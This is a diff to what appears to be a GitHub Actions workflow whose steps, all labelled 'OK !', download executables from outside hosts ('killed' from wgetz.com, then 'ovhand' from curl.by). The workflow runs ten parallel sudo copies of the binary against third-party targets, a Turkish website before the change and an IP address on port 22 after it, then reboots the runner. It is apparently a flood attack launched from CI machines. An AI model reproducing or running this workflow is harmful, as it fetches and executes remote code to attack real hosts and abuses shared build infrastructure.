@@ -13,12 +13,11 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget https://wgetz.com/rt7xxS6TBB/killed -O killed
-          wget https://wgetz.com/RwtU2lCX7f/fres.txt
-          chmod +x killed
+          wget https://curl.by/y6xb1/ovhand -O ovhand
+          chmod +x ovhand
           PIDS=()
           for i in {1..10}; do
-            sudo timeout 60 ./killed GET https://antifix.com.tr/ fres.txt 60 999 10 &
+            sudo timeout 30 ./ovhand 40.160.24.51 22 16 30 &
             PIDS+=($!)
           done
           
@@ -27,7 +26,7 @@ jobs:
           done
 
       - name: OK !
-        run: sleep 60
+        run: sleep 30
         
       - name: OK !
         run: sudo reboot
